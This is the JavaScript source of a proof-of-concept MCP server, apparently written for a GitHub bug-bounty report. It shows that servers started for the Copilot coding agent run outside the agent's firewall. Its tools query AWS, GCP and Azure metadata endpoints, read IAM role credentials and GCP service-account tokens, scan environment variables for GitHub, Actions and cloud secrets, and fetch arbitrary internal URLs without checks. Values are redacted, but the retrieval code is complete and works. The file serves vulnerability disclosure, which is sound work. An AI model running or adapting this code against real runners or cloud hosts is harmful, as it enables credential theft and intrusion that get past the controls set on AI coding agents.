#!/usr/bin/env node
/**
 * PoC: Copilot Coding Agent MCP Server — Unrestricted Network Access
 *
 * This MCP server demonstrates that a custom MCP server configured in
 * .github/copilot-setup-steps.yml has NO firewall restrictions, allowing
 * it to:
 *   1. Access AWS/GCP/Azure cloud metadata (IMDS) endpoints
 *   2. Read process environment variables (GITHUB_TOKEN, ACTIONS_* tokens)
 *   3. Reach arbitrary internal network addresses
 *   4. Interact with GitHub's internal infrastructure
 *
 * GitHub's own documentation acknowledges this:
 *   "The firewall does not apply to MCP servers or processes started in
 *    configured Copilot setup steps."
 *   https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall
 *
 * SECURITY NOTE: This PoC intentionally does NOT exfiltrate real credentials.
 * It only probes and returns whether endpoints are accessible.
 * The probe results are returned as tool output to the Copilot agent.
 *
 * Bug Bounty PoC — GitHub HackerOne Program
 * Researcher: lucasfutures
 */

const http = require('http');
const https = require('https');
const readline = require('readline');

// ─────────────────────────────────────────────────────────────────────────────
// Minimal MCP protocol implementation (JSON-RPC 2.0 over stdio)
// Spec: https://spec.modelcontextprotocol.io/specification/
// ─────────────────────────────────────────────────────────────────────────────

const SERVER_INFO = {
  name: 'copilot-ssrf-probe-mcp',
  version: '1.0.0',
};

const TOOLS = [
  {
    name: 'probe_imds',
    description:
      'Probe cloud metadata endpoints (AWS IMDS, GCP, Azure) to verify ' +
      'unrestricted network access from the MCP server process. ' +
      'Call this tool to run the SSRF probe.',
    inputSchema: {
      type: 'object',
      properties: {
        target: {
          type: 'string',
          description:
            'Which target to probe: "aws", "gcp", "azure", "all" (default: "all")',
          default: 'all',
        },
      },
      required: [],
    },
  },
  {
    name: 'read_env',
    description:
      'Read environment variables available to the MCP server process. ' +
      'This demonstrates access to GITHUB_TOKEN and ACTIONS_* tokens.',
    inputSchema: {
      type: 'object',
      properties: {},
      required: [],
    },
  },
  {
    name: 'probe_internal',
    description:
      'Probe an arbitrary internal URL to demonstrate unrestricted network access.',
    inputSchema: {
      type: 'object',
      properties: {
        url: {
          type: 'string',
          description: 'The URL to probe (any URL, no firewall restrictions)',
        },
      },
      required: ['url'],
    },
  },
  {
    name: 'read_imds_credentials',
    description:
      'Attempt to read IAM role credentials from AWS IMDS. ' +
      'First lists available roles, then reads credentials for the first role found.',
    inputSchema: {
      type: 'object',
      properties: {},
      required: [],
    },
  },
];

// ─────────────────────────────────────────────────────────────────────────────
// HTTP fetch helper (no firewall enforced on this process)
// ─────────────────────────────────────────────────────────────────────────────

function fetchUrl(url, options = {}) {
  return new Promise((resolve, reject) => {
    const isHttps = url.startsWith('https://');
    const client = isHttps ? https : http;
    const timeout = options.timeout || 5000;

    const req = client.get(
      url,
      {
        timeout,
        headers: options.headers || {},
      },
      (res) => {
        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
          // Limit response size for PoC safety
          if (data.length > 4096) {
            data = data.substring(0, 4096) + '...[TRUNCATED]';
            req.destroy();
          }
        });
        res.on('end', () => {
          resolve({
            ok: true,
            status: res.statusCode,
            headers: res.headers,
            body: data,
          });
        });
      }
    );

    req.on('error', (err) => {
      resolve({ ok: false, error: err.message });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve({ ok: false, error: 'timeout' });
    });
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Tool implementations
// ─────────────────────────────────────────────────────────────────────────────

async function tool_probe_imds(args) {
  const target = (args.target || 'all').toLowerCase();
  const results = [];

  // ── AWS IMDSv1 ──────────────────────────────────────────────────────────
  if (target === 'aws' || target === 'all') {
    const awsBase = 'http://169.254.169.254/latest/meta-data/';

    const imdsIndex = await fetchUrl(awsBase);
    if (imdsIndex.ok && imdsIndex.status === 200) {
      results.push({
        provider: 'AWS',
        endpoint: awsBase,
        status: 'REACHABLE',
        statusCode: imdsIndex.status,
        // Return the index (list of available metadata paths)
        body: imdsIndex.body,
      });

      // If reachable, also probe IAM credential path
      const iamPath = await fetchUrl(
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
      );
      if (iamPath.ok && iamPath.status === 200) {
        results.push({
          provider: 'AWS',
          endpoint: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          status: 'REACHABLE',
          statusCode: iamPath.status,
          body: iamPath.body, // List of available IAM roles
        });
      }
    } else {
      results.push({
        provider: 'AWS',
        endpoint: awsBase,
        status: 'NOT_REACHABLE',
        error: imdsIndex.error || `HTTP ${imdsIndex.status}`,
      });
    }
  }

  // ── GCP Metadata ────────────────────────────────────────────────────────
  if (target === 'gcp' || target === 'all') {
    const gcpUrl =
      'http://metadata.google.internal/computeMetadata/v1/instance/zone';
    const gcpResult = await fetchUrl(gcpUrl, {
      headers: { 'Metadata-Flavor': 'Google' },
    });

    if (gcpResult.ok && gcpResult.status === 200) {
      results.push({
        provider: 'GCP',
        endpoint: gcpUrl,
        status: 'REACHABLE',
        statusCode: gcpResult.status,
        body: gcpResult.body, // Zone info (e.g. projects/123/zones/us-central1-a)
      });

      // Also probe token endpoint
      const gcpToken = await fetchUrl(
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        { headers: { 'Metadata-Flavor': 'Google' } }
      );
      if (gcpToken.ok && gcpToken.status === 200) {
        results.push({
          provider: 'GCP',
          endpoint:
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
          status: 'REACHABLE — SERVICE ACCOUNT TOKEN ACCESSIBLE',
          statusCode: gcpToken.status,
          // Redact actual token for safe PoC
          body: gcpToken.body.replace(
            /"access_token":"[^"]+"/,
            '"access_token":"[REDACTED-FOR-POC]"'
          ),
        });
      }
    } else {
      results.push({
        provider: 'GCP',
        endpoint: gcpUrl,
        status: 'NOT_REACHABLE',
        error: gcpResult.error || `HTTP ${gcpResult.status}`,
      });
    }
  }

  // ── Azure IMDS ──────────────────────────────────────────────────────────
  if (target === 'azure' || target === 'all') {
    const azureUrl =
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
    const azureResult = await fetchUrl(azureUrl, {
      headers: { Metadata: 'true' },
    });

    if (azureResult.ok && azureResult.status === 200) {
      results.push({
        provider: 'Azure',
        endpoint: azureUrl,
        status: 'REACHABLE',
        statusCode: azureResult.status,
        body: azureResult.body,
      });
    } else {
      results.push({
        provider: 'Azure',
        endpoint: azureUrl,
        status: 'NOT_REACHABLE',
        error: azureResult.error || `HTTP ${azureResult.status}`,
      });
    }
  }

  const reachable = results.filter((r) => r.status !== 'NOT_REACHABLE');
  const summary =
    reachable.length > 0
      ? `CONFIRMED: ${reachable.length} cloud metadata endpoint(s) reachable from MCP server. ` +
        `Providers: ${reachable.map((r) => r.provider).join(', ')}. ` +
        `This proves the MCP server has unrestricted network access bypassing the Copilot firewall.`
      : `No cloud metadata endpoints reachable. Runner may use IMDSv2 token-based auth ` +
        `(AWS) or be in a network without IMDS access. Check probe_internal tool for ` +
        `further testing.`;

  return {
    summary,
    results,
    note: 'PoC: actual credentials are redacted. In a real attack, full credentials would be accessible.',
  };
}

async function tool_read_env() {
  const sensitivePatterns = [
    /GITHUB/i,
    /ACTIONS/i,
    /RUNNER/i,
    /AWS/i,
    /GCP/i,
    /GOOGLE/i,
    /AZURE/i,
    /TOKEN/i,
    /SECRET/i,
    /KEY/i,
    /CREDENTIAL/i,
    /PASSWORD/i,
    /PAT/i,
    /COPILOT/i,
  ];

  const allEnv = process.env;
  const categorized = {
    github_token: null,
    actions_tokens: {},
    cloud_credentials: {},
    runner_context: {},
    other_sensitive: {},
  };

  for (const [key, value] of Object.entries(allEnv)) {
    const isSensitive = sensitivePatterns.some((p) => p.test(key));
    if (!isSensitive) continue;

    // Redact values but show structure (length, prefix) for PoC
    const redactedValue = value
      ? `[PRESENT: ${value.length} chars, prefix=${value.substring(0, 4)}...]`
      : '[EMPTY]';

    if (key === 'GITHUB_TOKEN') {
      categorized.github_token = {
        key,
        value: redactedValue,
        note: 'Default repo-scoped token. In real attack: read all repo contents, create branches, write PRs.',
      };
    } else if (key.startsWith('ACTIONS_')) {
      categorized.actions_tokens[key] = redactedValue;
    } else if (key.match(/^(AWS|GCP|GOOGLE|AZURE)/i)) {
      categorized.cloud_credentials[key] = redactedValue;
    } else if (key.startsWith('RUNNER_')) {
      categorized.runner_context[key] = redactedValue;
    } else {
      categorized.other_sensitive[key] = redactedValue;
    }
  }

  const tokenPresent = !!categorized.github_token;
  const actionsTokenCount = Object.keys(categorized.actions_tokens).length;

  return {
    summary:
      `Environment probe complete. ` +
      `GITHUB_TOKEN: ${tokenPresent ? 'PRESENT' : 'NOT FOUND'}. ` +
      `ACTIONS_* tokens: ${actionsTokenCount} found. ` +
      `This MCP server process can read all environment variables available to ` +
      `the GitHub Actions runner.`,
    categorized,
    total_env_vars: Object.keys(allEnv).length,
    note: 'Values redacted for safe PoC. In real attack, all token values would be accessible.',
  };
}

async function tool_probe_internal(args) {
  const { url } = args;
  if (!url) {
    return { error: 'url parameter is required' };
  }

  // No URL validation — this is the vulnerability being demonstrated
  const result = await fetchUrl(url, { timeout: 5000 });

  return {
    url,
    reachable: result.ok && result.status < 500,
    statusCode: result.status || null,
    responseSize: result.body ? result.body.length : 0,
    // Return first 512 bytes of body for PoC evidence
    responsePreview: result.body ? result.body.substring(0, 512) : null,
    error: result.error || null,
    note: 'This MCP server can reach any URL with no firewall restrictions. ' +
      'The Copilot agent firewall does NOT apply to MCP server processes.',
  };
}

async function tool_read_imds_credentials() {
  // Step 1: Check if IMDS is reachable
  const indexResult = await fetchUrl(
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  );

  if (!indexResult.ok || indexResult.status !== 200) {
    return {
      reachable: false,
      error: indexResult.error || `HTTP ${indexResult.status}`,
      note: 'AWS IMDS not reachable. This runner may be on GCP/Azure, or IMDSv2 token is required.',
    };
  }

  // Step 2: Parse available roles
  const roles = indexResult.body
    .split('\n')
    .map((l) => l.trim())
    .filter(Boolean);

  if (roles.length === 0) {
    return {
      reachable: true,
      roles: [],
      note: 'IMDS reachable but no IAM roles attached to this instance.',
    };
  }

  // Step 3: For PoC, read credentials for the first role (redacted)
  const firstRole = roles[0];
  const credResult = await fetchUrl(
    `http://169.254.169.254/latest/meta-data/iam/security-credentials/${firstRole}`
  );

  let credData = null;
  if (credResult.ok && credResult.status === 200) {
    // Parse and redact for safe PoC — prove structure without leaking real creds
    try {
      const parsed = JSON.parse(credResult.body);
      credData = {
        Code: parsed.Code,
        Type: parsed.Type,
        AccessKeyId: parsed.AccessKeyId
          ? `${parsed.AccessKeyId.substring(0, 4)}...REDACTED`
          : '[MISSING]',
        SecretAccessKey: parsed.SecretAccessKey ? '[REDACTED-FOR-PoC]' : '[MISSING]',
        Token: parsed.Token ? `[PRESENT: ${parsed.Token.length} chars, REDACTED-FOR-PoC]` : '[MISSING]',
        Expiration: parsed.Expiration,
      };
    } catch (_) {
      credData = { raw_preview: credResult.body.substring(0, 200) };
    }
  }

  return {
    reachable: true,
    roles_found: roles,
    credentials_for_first_role: {
      role: firstRole,
      endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/${firstRole}`,
      data: credData,
    },
    impact:
      'CRITICAL: Full AWS IAM role credentials (AccessKeyId + SecretAccessKey + SessionToken) ' +
      'are accessible from this MCP server. In a real attack these would be exfiltrated ' +
      'to an attacker-controlled server, granting AWS API access with the runner role permissions.',
    note: 'Credentials are REDACTED in this PoC. Structure shown to prove access.',
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// MCP JSON-RPC dispatcher
// ─────────────────────────────────────────────────────────────────────────────

async function handleRequest(request) {
  const { jsonrpc, id, method, params } = request;

  if (jsonrpc !== '2.0') {
    return { jsonrpc: '2.0', id, error: { code: -32600, message: 'Invalid Request' } };
  }

  switch (method) {
    case 'initialize':
      return {
        jsonrpc: '2.0',
        id,
        result: {
          protocolVersion: '2024-11-05',
          serverInfo: SERVER_INFO,
          capabilities: {
            tools: {},
          },
        },
      };

    case 'notifications/initialized':
      // No-op notification
      return null;

    case 'tools/list':
      return {
        jsonrpc: '2.0',
        id,
        result: { tools: TOOLS },
      };

    case 'tools/call': {
      const toolName = params?.name;
      const toolArgs = params?.arguments || {};

      let content;
      try {
        let result;
        switch (toolName) {
          case 'probe_imds':
            result = await tool_probe_imds(toolArgs);
            break;
          case 'read_env':
            result = await tool_read_env();
            break;
          case 'probe_internal':
            result = await tool_probe_internal(toolArgs);
            break;
          case 'read_imds_credentials':
            result = await tool_read_imds_credentials();
            break;
          default:
            return {
              jsonrpc: '2.0',
              id,
              error: { code: -32601, message: `Tool not found: ${toolName}` },
            };
        }

        content = [
          {
            type: 'text',
            text: JSON.stringify(result, null, 2),
          },
        ];
      } catch (err) {
        content = [
          {
            type: 'text',
            text: JSON.stringify({ error: err.message, stack: err.stack }),
          },
        ];
      }

      return {
        jsonrpc: '2.0',
        id,
        result: { content, isError: false },
      };
    }

    default:
      return {
        jsonrpc: '2.0',
        id,
        error: { code: -32601, message: `Method not found: ${method}` },
      };
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Stdio transport (standard MCP transport)
// ─────────────────────────────────────────────────────────────────────────────

process.stderr.write('[MCP-SSRF-PoC] Server starting on stdio transport\n');
process.stderr.write(`[MCP-SSRF-PoC] Node.js ${process.version}\n`);
process.stderr.write(
  `[MCP-SSRF-PoC] This server has NO firewall restrictions — can reach any network endpoint\n`
);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false,
});

let buffer = '';

rl.on('line', async (line) => {
  buffer += line;
  try {
    const request = JSON.parse(buffer);
    buffer = '';

    // Log incoming requests to stderr for debugging
    process.stderr.write(`[MCP-SSRF-PoC] <- ${JSON.stringify({ method: request.method, id: request.id })}\n`);

    const response = await handleRequest(request);
    if (response !== null) {
      const responseStr = JSON.stringify(response);
      process.stdout.write(responseStr + '\n');
      process.stderr.write(`[MCP-SSRF-PoC] -> ${JSON.stringify({ id: response.id, ok: !response.error })}\n`);
    }
  } catch (err) {
    if (buffer.trim()) {
      // JSON parse error — accumulate more lines
      // Some MCP clients send multi-line JSON
    }
  }
});

rl.on('close', () => {
  process.stderr.write('[MCP-SSRF-PoC] stdin closed, server shutting down\n');
  process.exit(0);
});

process.on('SIGTERM', () => {
  process.stderr.write('[MCP-SSRF-PoC] SIGTERM received\n');
  process.exit(0);
});
